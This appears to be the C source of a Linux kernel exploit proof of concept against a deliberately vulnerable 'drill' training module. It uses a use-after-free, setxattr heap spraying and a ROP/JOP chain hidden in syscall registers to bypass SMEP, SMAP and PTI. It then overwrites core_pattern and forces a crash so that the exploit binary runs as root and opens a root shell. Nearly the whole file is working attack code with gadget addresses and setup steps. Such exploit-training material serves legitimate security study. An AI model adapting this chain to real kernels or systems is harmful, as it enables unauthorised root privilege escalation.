/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit invoking a callback in the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Use Linux kernel version v6.12.7 tag (319addc2ad901dac4d6cc931d77ef35073e0942f)
 *
 * 2) Use gcc version 11.4.0
 *
 * 3) Change these options in `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_GDB_SCRIPTS=y
 *
 * 4) Ensure that these options are disabled:
 *   - CONFIG_RANDOM_KMALLOC_CACHES (to allow naive heap spraying for exploiting UAF)
 *   - CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT (to have a predictable stack pointer value)
 *
 * 5) Compile the kernel and run the VM with the needed settings:
 *   - Run qemu with "-cpu qemu64,+smep,+smap"
 *   - Run the kernel with "pti=on nokaslr"
 *
 * This PoC performs control flow hijack and gains LPE bypassing
 * SMEP, MITIGATION_PAGE_TABLE_ISOLATION, and SMAP via a ROP/JOP chain
 * placed in the kernelspace.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/user.h>
#include <sys/sendfile.h>
#include "drill.h"

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

#define MMAP_SZ				(PAGE_SIZE * 2)
#define PAYLOAD_SZ			95

static const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COPY_FROM_USER_PTR		0xffffffff8154b740UL
#define CORE_PATTERN_PTR		0xffffffff82b78980UL
#define MSLEEP_PTR			0xffffffff81142800UL

/* ROP gadgets */
#define STACKPIVOT_GADGET_PTR		0xffffffff811d9489UL /* add rsp, 0x1a8 ; ret */
#define POP_RDX_POP_RDI			0xffffffff8158f54fUL /* pop rdx ; pop rdi ; ret */
#define POP_RSI				0xffffffff81d1da59UL /* pop rsi ; ret */
#define POP_RAX				0xffffffff810604c4UL /* pop rax ; ret */
#define PUSH_RSP_POP_RSI_POP_RBX	0xffffffff810e5abcUL /* push rsp ; pop rsi ; pop rbx ; ret */
#define POP_R15				0xffffffff810040adUL /* pop r15 ; ret */
#define SUB_RSI_RAX			0xffffffff813f50d5UL /* sub rsi, rax ; mov rax, rcx ; sub rax, rsi ; ret */
#define MOV_RAX_QWORD_PTR_RSI		0xffffffff812dcc30UL /* mov rax, qword ptr [rsi] ; ret */
#define PUSH_RAX_POP_RSP_ADD_RSP_0X10	0xffffffff814d71faUL /* push rax ; pop rsp ; jmp 0xffffffff814d72ad
								where 0xffffffff814d72ad contains: add rsp,0x10 ; ret */

/* ========================================================================== */

int do_cpu_pinning(int cpu_n)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", cpu_n);
	return EXIT_SUCCESS;
}

int run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return EXIT_FAILURE;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
	} else {
		if (wait(&status) < 0)
			perror("[-] wait");

		printf("[+] /bin/sh finished\n");
	}

	return EXIT_SUCCESS;
}

void init_payload(char *p, size_t size)
{
	struct drill_item_t *item = (struct drill_item_t *)p;
	unsigned long *rop_chain_2 = (unsigned long *)item->data;
	unsigned long offset = 0;

	memset(p, 0x41, size);

	item->callback = (void (*)(void))STACKPIVOT_GADGET_PTR;

	rop_chain_2[offset++] = POP_RDX_POP_RDI;
	rop_chain_2[offset++] = strlen(fake_core_pattern) + 1; /* the value for rdx,
								  function parameter #3 */
	rop_chain_2[offset++] = CORE_PATTERN_PTR; /* the value for rdi, function parameter #1 */
	rop_chain_2[offset++] = POP_RSI;
	rop_chain_2[offset++] = 0x42; /* dummy value that will be corrupted by a slab freelist ptr,
					 which is written at the offset 0x30 from the beginning
					 of the slab chunk (setxattr() frees the sprayed object
					 shortly after its allocation) */
	rop_chain_2[offset++] = POP_RSI;
	rop_chain_2[offset++] = (unsigned long)fake_core_pattern; /* the value for rsi,
								     function parameter #2 */
	rop_chain_2[offset++] = COPY_FROM_USER_PTR;
	rop_chain_2[offset++] = MSLEEP_PTR;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback 0x%lx\n", (unsigned long)item->callback);
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	/*
	 * Let's place the ROP chain #1 in the pt_regs that reside at the end
	 * (i.e. top) of the kernel stack. See the order of pt_regs registers in
	 * arch/x86/include/asm/ptrace.h.
	 *
	 * These gadgets calculate the address of the ROP chain #2 inside the
	 * drill_item_t object (allocated in slab) and perform stack pivoting onto it.
	 */
	__asm__ __volatile__(
		".intel_syntax noprefix\n\t"
		"mov r14, " STR(POP_RAX) "\n\t"
		"mov r13, 0x00000000000001e0\n\t" /* put this value into rax */
		"mov r12, " STR(PUSH_RSP_POP_RSI_POP_RBX) "\n\t" /* put the stack pointer into rsi */
		/* rbp in pt_regs stores a dummy value for "pop rbx" above */
		"mov rbx, " STR(POP_R15) "\n\t" /* move the uncontrolled r11 value to r15, for example */
		/* r11 in pt_regs stores eflags, when SYSRET is used to exit to userspace */
		"mov r10, " STR(SUB_RSI_RAX) "\n\t" /* get the address of the drill_item_t address in stack */
		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t" /* put the drill_item_t address into rax */
		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t" /* do stack pivoting into drill_item_t.data */
		".att_syntax prefix");

	/* Now perform the syscall with the crafted values in the registers */
	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int check_core()
{
	/* check if /proc/sys/kernel/core_pattern has been overwritten */
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	if (core < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	if (memfd < 0) {
		perror("[-] memfd_create");
		return;
	}
	if (sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff) < 0) {
		perror("[-] sendfile");
		close(memfd);
		return;
	}
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	/*
	 * Trigger program crash and cause kernel to executes program from
	 * `core_pattern` which is our "root" binary
	 */
	*(size_t *)0 = 0;
}

void wait_and_trigger_core_pattern(void)
{
	int ret = EXIT_FAILURE;

	ret = do_cpu_pinning(1);
	if (ret == EXIT_FAILURE)
		return;

	setsid();
	crash("");
}

int main(int argc, char **argv)
{
	pid_t pid = -1;
	int result = EXIT_FAILURE;
	char *spray_data = NULL;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	int spray_fd = -1;
	int stdinfd, stdoutfd, stderrfd = -1;
	char path0[64], path1[64], path2[64];

	if (argc > 1) {
		pid = strtoull(argv[1], NULL, 10);
		snprintf(path0, sizeof(path0), "/proc/%d/fd/0", pid);
		snprintf(path1, sizeof(path1), "/proc/%d/fd/1", pid);
		snprintf(path2, sizeof(path2), "/proc/%d/fd/2", pid);
		stdinfd = open(path0, O_RDONLY);
		stdoutfd = open(path1, O_WRONLY);
		stderrfd = open(path2, O_WRONLY);
		if (stdinfd < 0 || stdoutfd < 0 || stderrfd < 0) {
			perror("[-] open");
			goto end;
		}
		if (dup2(stdinfd, 0) < 0 || dup2(stdoutfd, 1) < 0 ||
		    dup2(stderrfd, 2) < 0) {
			perror("[-] dup2");
			close(stdinfd);
			close(stdoutfd);
			close(stderrfd);
			goto end;
		}

		if (getuid() == 0 && geteuid() == 0) {
			printf("[+] finish as: uid=0, euid=0, start sh...\n");
			result = EXIT_SUCCESS;
			if (run_sh() == EXIT_FAILURE) {
				perror("[-] runnig shell");
				goto end;
			}
			goto end;
		} else {
			printf("[-] heap spraying\n");
		}
	}


	/*
	 * In the parent process we perform the memory corruption, and in the child
	 * process we wait for the changed core_pattern and trigger a crash to get
	 * privilege escalation.
	 */
	pid = fork();
	if (pid < 0) {
		perror("[-] fork");
		goto end;
	}

	if (pid == 0) {
		wait_and_trigger_core_pattern(); /* should not return */
		return EXIT_FAILURE;
	}

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	/*
	 * Prepare
	 */

	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) {
		perror("[-] mmap");
		goto end;
	}

	init_payload(spray_data, MMAP_SZ);

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	spray_fd = open("./foobar", O_CREAT, S_IRUSR | S_IWUSR);
	if (spray_fd < 0) {
		perror("[-] open failed");
		goto end;
	}

	printf("[+] spray_fd is opened\n");

	if (act(act_fd, DRILL_ACT_ALLOC, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_ALLOC\n");

	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

	/*
	 * Exploit
	 */

	if (act(act_fd, DRILL_ACT_FREE, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_FREE\n");

	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
	printf("[+] setxattr is called (returned %d)\n", ret);

	/*
	 * During a control flow hijack, the kernel often crashes with a double fault error.
	 * This happens when the time slice ends and the exploit process is preempted by another process.
	 * Let's call sched_yield() to make control flow hijacking more stable.
	 * This function frees up the current CPU for other tasks, causing the ROP chain to
	 * execute from the new scheduler time slice.
	 */
	if (sched_yield() < 0) {
		perror("[-] sched_yield");
		goto end;
	}

	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

end:
	if (stdinfd > 0 || stdoutfd > 0 || stderrfd > 0) {
		if (close(stdinfd) < 0 || close(stdoutfd) < 0 || close(stderrfd) < 0) {
			perror("[-] close");
		}
	}
	if (spray_fd >= 0) {
		ret = close(spray_fd);
		if (ret != 0)
			perror("[-] close spray_fd");
	}

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	if (remove("./foobar") != 0)
		perror("[-] remove ./foobar");

	return result;
}
